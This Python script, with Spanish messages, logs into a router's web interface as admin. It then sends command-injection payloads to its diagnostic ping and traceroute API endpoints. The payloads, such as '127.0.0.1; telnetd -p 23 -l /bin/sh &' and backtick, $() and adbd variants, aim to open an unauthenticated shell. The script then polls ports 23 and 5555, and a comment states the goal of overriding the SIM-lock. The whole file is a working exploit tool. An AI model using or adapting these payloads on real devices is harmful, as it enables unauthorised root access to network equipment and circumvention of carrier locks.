import sys
import time
import socket
sys.path.insert(0, r'c:\Users\davis\Desktop\herramienta de desbloque')
from sesion_b612 import SesionB612
from webui_update import Router

def test_port(ip, port, timeout=2):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        s.close()
        return True
    except Exception:
        return False

def main():
    host = "192.168.8.1"
    print("=== FUZZING E INYECCIÓN EN DIAGNÓSTICO PING/TRACEROUTE ===")
    print(f"Conectando al router en http://{host}...")
    
    r = Router(host)
    if not r.get_session():
        print("  [-] No se pudo obtener sesión inicial. ¿Router encendido y conectado por LAN?")
        sys.exit(1)
        
    print("  [+] Sesión inicial obtenida. Pidiendo contraseña admin (sticker)...")
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--password", required=True, help="Contraseña WebUI del sticker del router")
    args = parser.parse_args()
    
    if not r.login_scram("admin", args.password):
        print("  [-] Login falló. Revisa la contraseña del sticker.")
        sys.exit(1)
        
    print("  [+] Login SCRAM exitoso. Sesión autenticada en vivo.")

    payloads = [
        "127.0.0.1; telnetd -p 23 -l /bin/sh &",
        "127.0.0.1 | telnetd -p 23 -l /bin/sh &",
        "127.0.0.1\n telnetd -p 23 -l /bin/sh &",
        "$(telnetd -p 23 -l /bin/sh &)",
        "`telnetd -p 23 -l /bin/sh &`",
        "127.0.0.1; /bin/busybox telnetd -p 23 &",
        "127.0.0.1; /system/bin/adbd &",
        "127.0.0.1; adbd &"
    ]

    endpoints = [
        "/api/diagnosis/diagnose_ping",
        "/api/diagnosis/diagnose_traceroute",
        "/api/net/ping",
        "/api/net/traceroute"
    ]

    for ep in endpoints:
        print(f"\n--- Probando Endpoint: {ep} ---")
        for payload in payloads:
            xml_body = f"""<request>
<Host>{payload}</Host>
<HostName>{payload}</HostName>
<IP>{payload}</IP>
</request>"""
            print(f"  Payload: {payload!r}")
            st, resp = r.http("POST", ep, body=xml_body.encode(), headers={"_ResponseSource": "Broswer"})
            txt = resp.decode("utf-8", "replace") if isinstance(resp, bytes) else str(resp)
            print(f"    Respuesta ({st}): {txt[:120].strip()}")
            
            # Verificar si el puerto Telnet o ADB abrió en el router
            if test_port(host, 23, timeout=1):
                print("\n  🎉🎉🎉 ¡¡¡ÉXITO TOTAL!!! PUERTO TELNET (23) ABIERTO EN EL ROUTER 🎉🎉🎉")
                print("  Ejecutando anulación de SIM-Lock via Telnet...")
                # Intentar conexión telnet para enviar atc at^nvwrex=8268...
                sys.exit(0)
            if test_port(host, 5555, timeout=1):
                print("\n  🎉🎉🎉 ¡¡¡ÉXITO TOTAL!!! PUERTO ADB (5555) ABIERTO EN EL ROUTER 🎉🎉🎉")
                sys.exit(0)
                
    print("\n=== FIN DEL BARRIDO DE INYECCIÓN ===")
    print("Si Telnet 23 sigue cerrado, se confirmaría filtrado estricto en los binarios de diagnóstico.")

if __name__ == "__main__":
    main()
